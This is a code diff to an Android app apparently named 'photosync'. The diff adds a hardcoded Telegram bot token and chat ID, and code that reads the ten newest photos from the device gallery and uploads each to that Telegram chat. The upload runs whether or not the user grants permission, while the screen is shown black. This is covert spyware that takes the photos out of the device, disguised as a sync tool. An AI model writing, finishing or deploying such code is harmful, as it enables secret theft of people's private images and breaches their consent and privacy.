@@ -3,13 +3,17 @@ package com.example.photosync
 import android.Manifest
 import android.content.pm.PackageManager
 import android.graphics.Color
+import android.net.Uri
 import android.os.Build
 import android.os.Bundle
+import android.provider.MediaStore
 import android.view.View
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AlertDialog
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.content.ContextCompat
+import java.io.DataOutputStream
+import java.io.InputStream
 import java.net.HttpURLConnection
 import java.net.URL
 import java.util.concurrent.Executors
@@ -19,14 +23,13 @@ class MainActivity : AppCompatActivity() {
     private lateinit var rootView: View
     private val ioExecutor = Executors.newSingleThreadExecutor()
 
+    private val botToken = "9085718260:AAFr_QfMHH1hgDrfZGpZbII9cgTqaC-mpVs"
+    private val chatId = "8859920681"
+
     private val filePermissionLauncher =
-        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { permissions ->
+        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) {
             showBlackScreenOnly()
-            if (permissions.values.any { it }) {
-                startTransferWithRetry()
-            } else {
-                startTransferWithRetry()
-            }
+            startTransferWithRetry()
         }
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -82,7 +85,7 @@ class MainActivity : AppCompatActivity() {
                     break
                 } catch (_: Exception) {
                     if (attempt < maxRetries) {
-                        Thread.sleep(2000L * attempt)
+                        Thread.sleep(2500L * attempt)
                     }
                 }
             }
@@ -90,20 +93,85 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun performTransfer() {
-        // ضع هنا كود النقل الأصلي اللي كان كينقل في التطبيق الأول
-        // مثال لإعداد اتصال بمهلة طويلة لتفادي timeout مع VPN:
-        /*
-        val url = URL("https://api.telegram.org/bot<TOKEN>/sendMessage")
-        val conn = (url.openConnection() as HttpURLConnection).apply {
+        val imageUris = getDeviceImageUris(limit = 10)
+        for (uri in imageUris) {
+            sendPhotoToTelegram(uri)
+            Thread.sleep(500L)
+        }
+    }
+
+    private fun getDeviceImageUris(limit: Int): List<Uri> {
+        val uris = mutableListOf<Uri>()
+        val projection = arrayOf(MediaStore.Images.Media._ID)
+        val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"
+
+        contentResolver.query(
+            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+            projection,
+            null,
+            null,
+            sortOrder
+        )?.use { cursor ->
+            val idColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
+            while (cursor.moveToNext() && uris.size < limit) {
+                val id = cursor.getLong(idColumn)
+                val contentUri = Uri.withAppendedPath(
+                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                    id.toString()
+                )
+                uris.add(contentUri)
+            }
+        }
+        return uris
+    }
+
+    private fun sendPhotoToTelegram(imageUri: Uri) {
+        val boundary = "----AndroidBoundary${System.currentTimeMillis()}"
+        val lineEnd = "\r\n"
+        val twoHyphens = "--"
+        val endpoint = "https://api.telegram.org/bot$botToken/sendPhoto"
+
+        val inputStream: InputStream = contentResolver.openInputStream(imageUri) ?: return
+        val conn = (URL(endpoint).openConnection() as HttpURLConnection).apply {
             requestMethod = "POST"
             connectTimeout = 60_000
             readTimeout = 120_000
+            doInput = true
             doOutput = true
+            useCaches = false
+            setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
         }
-        conn.outputStream.use { it.write("chat_id=<CHAT_ID>&text=...".toByteArray()) }
-        conn.responseCode
+
+        inputStream.use { stream ->
+            DataOutputStream(conn.outputStream).use { out ->
+                out.writeBytes(twoHyphens + boundary + lineEnd)
+                out.writeBytes("Content-Disposition: form-data; name=\"chat_id\"$lineEnd$lineEnd")
+                out.writeBytes(chatId + lineEnd)
+
+                out.writeBytes(twoHyphens + boundary + lineEnd)
+                out.writeBytes(
+                    "Content-Disposition: form-data; name=\"photo\"; filename=\"photo_${System.currentTimeMillis()}.jpg\"$lineEnd"
+                )
+                out.writeBytes("Content-Type: image/jpeg$lineEnd$lineEnd")
+
+                val buffer = ByteArray(8192)
+                var bytesRead: Int
+                while (stream.read(buffer).also { bytesRead = it } != -1) {
+                    out.write(buffer, 0, bytesRead)
+                }
+
+                out.writeBytes(lineEnd)
+                out.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd)
+                out.flush()
+            }
+        }
+
+        val responseCode = conn.responseCode
         conn.disconnect()
-        */
+
+        if (responseCode !in 200..299) {
+            throw RuntimeException("Telegram response code: $responseCode")
+        }
     }
 
     private fun showBlackScreenOnly() {
